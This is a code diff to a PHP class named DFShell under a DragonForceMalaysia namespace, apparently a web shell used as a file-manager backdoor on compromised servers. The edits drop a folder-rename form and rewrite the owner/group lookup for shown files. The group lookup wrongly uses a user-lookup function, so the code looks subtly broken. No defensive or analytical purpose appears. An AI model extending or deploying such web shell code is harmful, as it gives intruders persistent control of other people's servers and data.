@@ -1,4 +1,5 @@
 <?php
+
 namespace DragonForceMalaysia;
 
 # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
@@ -519,10 +520,8 @@ class DFShell{
                         $filtered = $this->Dec($this->DFSDirFilter($path)) . $slashtype;
                         $this->string = $filtered . $p;
 
-                        $dirform = "<form action='' method='POST'>
-                        <input type='hidden' name='dirpath' value='".$filtered . $p."'>
-                        <input type='text' name='rename' placeholder='".$p."'>
-                        </form>";
+                        $uid = explode(':',$this->DFSOG($filtered.$slashtype.$p));
+                        //$og = posix_getpwuid($uid[0]);
 
                         echo "<p><tr><td id='iconx'><i class='fa-regular fa-folder'></i></td><td id='tbname'><a href='?dfp=".urlencode($this->Enc())."'>$p</a></td>";
                         echo "<td></td>";
@@ -882,7 +881,13 @@ class DFShell{
     }
 
     public function DFSOG($file){
-        $owner_group = ((fileowner($file))?:'-') . ':' . ((filegroup($file))?:'-');
+        if($GLOBALS['DFSPlatform']!=='win'){
+            $owner_file = (fileowner($file)?:0);
+            $group_file = (filegroup($file)?:0);
+            $owner_group = posix_getpwuid($owner_file)['name'] . ':' . posix_getpwuid($group_file)['name'];
+        }else{
+            $owner_group = "-:-";
+        }
         return $owner_group;
     }
 
